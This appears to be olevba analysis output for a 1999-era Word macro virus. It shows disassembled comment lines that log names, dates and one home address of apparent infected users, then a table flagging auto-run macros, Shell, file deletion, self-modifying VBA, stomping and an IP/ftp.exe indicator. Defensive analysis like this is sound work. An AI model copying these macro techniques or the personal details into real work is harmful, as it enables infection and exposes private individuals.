' 	QuoteRem 0x0000 0x0025 " 11:23:23 PM - Wednesday, 10 Mar 1999"
' Line #247:
' 	QuoteRem 0x0000 0x000C " Sam Panesar"
' Line #248:
' 	QuoteRem 0x0000 0x0000 ""
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' 	QuoteRem 0x0000 0x0025 " 10:02:54 PM - Wednesday, 10 Mar 1999"
' Line #253:
' 	QuoteRem 0x0000 0x0008 " ENDUSER"
' Line #254:
' 	QuoteRem 0x0000 0x0013 " Cynthia K. Seymour"
' Line #255:
' 	QuoteRem 0x0000 0x001A " 126 University Gardens #3"
' Line #256:
' 	QuoteRem 0x0000 0x001A " Charlottesville, VA 22903"
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' 	QuoteRem 0x0000 0x0022 " 04:44:24 PM - Sábado, 20 Mar 1999"
' Line #261:
' 	QuoteRem 0x0000 0x000F " Gerardo Ibarra"
' Line #262:
' 	QuoteRem 0x0000 0x0000 ""
' Line #263:
' Line #264:
' Line #265:
' Line #266:
' 	QuoteRem 0x0000 0x0023 " 05:06:43 PM - Tuesday, 23 Mar 1999"
' Line #267:
' 	QuoteRem 0x0000 0x0005 " 1518"
' Line #268:
' 	QuoteRem 0x0000 0x0000 ""
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' 	QuoteRem 0x0000 0x0025 " 02:05:06 PM - Wednesday, 24 Mar 1999"
' Line #273:
' 	QuoteRem 0x0000 0x0011 " Sanford Antignas"
' Line #274:
' 	QuoteRem 0x0000 0x0000 ""
' Line #275:
' Line #276:
' Line #277:
' Line #278:
' 	QuoteRem 0x0000 0x0022 " 02:18:36  - Thursday, 25 Mar 1999"
' Line #279:
' 	QuoteRem 0x0000 0x0003 " AS"
' Line #280:
' 	QuoteRem 0x0000 0x0000 ""
' Line #281:
' Line #282:
' Line #283:
' Line #284:
' 	QuoteRem 0x0000 0x0020 " 11:24:16  - Monday, 29 Mar 1999"
' Line #285:
' 	QuoteRem 0x0000 0x0005 " EGWY"
' Line #286:
' 	QuoteRem 0x0000 0x0000 ""
' Line #287:
' Line #288:
' Line #289:
' Line #290:
' 	QuoteRem 0x0000 0x0023 " 03:22:12 PM - Thursday, 8 Apr 1999"
' Line #291:
' 	QuoteRem 0x0000 0x0009 " Ditry PC"
' Line #292:
' 	QuoteRem 0x0000 0x0000 ""
' Line #293:
' Line #294:
' Line #295:
' Line #296:
' 	QuoteRem 0x0000 0x0020 " 02:47:23  - ñóááîòà, 8 ìàé 1999"
' Line #297:
' 	QuoteRem 0x0000 0x0011 " Mike Pavluschick"
' Line #298:
' 	QuoteRem 0x0000 0x0000 ""
' Line #299:
' Line #300:
' Line #301:
' Line #302:
' 	QuoteRem 0x0000 0x0022 " 11:07:52 PM - Sunday, 27 Jun 1999"
' Line #303:
' 	QuoteRem 0x0000 0x000C " Costin RAIU"
' Line #304:
' 	QuoteRem 0x0000 0x000F " craiu@gecad.ro"
' Line #305:
' Line #306:
' Line #307:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

